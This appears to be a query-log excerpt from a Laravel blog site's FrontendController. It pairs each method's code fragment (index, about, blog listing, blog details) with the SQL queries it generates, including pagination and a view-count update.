app/Http/Controllers/Front/FrontendController.php

select * from `site_contents`
---
    public function index()
    {
       $sections = SiteContent::get();

select * from `site_contents` where `slug` = 'about' limit 1
select * from `pages` where `slug` = 'about' and `lang` = 'en' limit 1
---
    public function about()
    {
        $section = SiteContent::where('slug','about')->firstOrFail();
        $page = Page::where('slug','about')->where('lang',app()->currentLocale())->first();

select * from `blogs` where `status` = 1 and exists (select * from `blog_categories` where `blogs`.`category_id` = `blog_categories`.`id` and `status` = 1) order by `created_at` desc limit 9 offset 0
select count(*) as aggregate from `blogs` where `status` = 1 and exists (select * from `blog_categories` where `blogs`.`category_id` = `blog_categories`.`id` and `status` = 1)
---
    public function blogs()
    {
        $blogs = Blog::where('status',1)
        ->whereHas('category',function($q){
            $q->where('status',1)->when(request('category'),function($cat){
               return $cat->where('slug',request('category'));
            });
        })
        ->latest()->paginate(9);

select * from `blog_categories` where `blog_categories`.`id` in (8, 9, 10)
select * from `blogs` where `id` != 66 and `status` = 1 and exists (select * from `blog_categories` where `blogs`.`category_id` = `blog_categories`.`id` and `status` = 1) order by `created_at` desc limit 8
update `blogs` set `views` = 9, `blogs`.`updated_at` = '2022-09-05 01:33:49' where `id` = 66
---
    public function blogDetails($id,$slug)
    {
        $blog = Blog::where('id',$id)->where('status',1)->whereHas('category',function($q){
            $q->where('status',1);
        })->with('category')->firstOrFail();

        $latests = Blog::where('id','!=',$blog->id)->where('status',1)->whereHas('category',function($q){
            $q->where('status',1);
        })->with('category')->latest()->take(8)->get();
        $blog->views += 1;
        $blog->update();